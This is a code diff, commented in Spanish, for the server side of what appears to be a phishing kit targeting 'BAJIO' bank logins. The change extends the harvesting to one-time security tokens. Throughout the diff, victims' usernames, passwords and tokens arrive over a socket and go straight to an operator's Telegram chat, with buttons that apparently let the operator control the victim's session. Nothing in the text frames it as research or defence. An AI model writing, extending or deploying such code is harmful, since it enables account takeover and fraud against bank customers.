@@ -26,11 +26,13 @@ app.use(bodyParser.json());
 io.on('connection', (socket) => {
   console.log('🧠 Usuario conectado:', socket.id);
 
-  // Login principal
-  socket.on('dataForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
+  // Login principal - Ahora se recibe el token
+  socket.on('dataForm', ({ usuario, contrasena, token, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso BAJIO RICKSAN:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n`;
+    // Crear el mensaje incluyendo el token
+    const mensaje = `🔐 Nuevo intento de acceso BAJIO RICKSAN:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n🔑 Token: ${token}\n`;
+
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -43,6 +45,7 @@ io.on('connection', (socket) => {
       }
     };
 
+    // Enviar el mensaje con el token
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
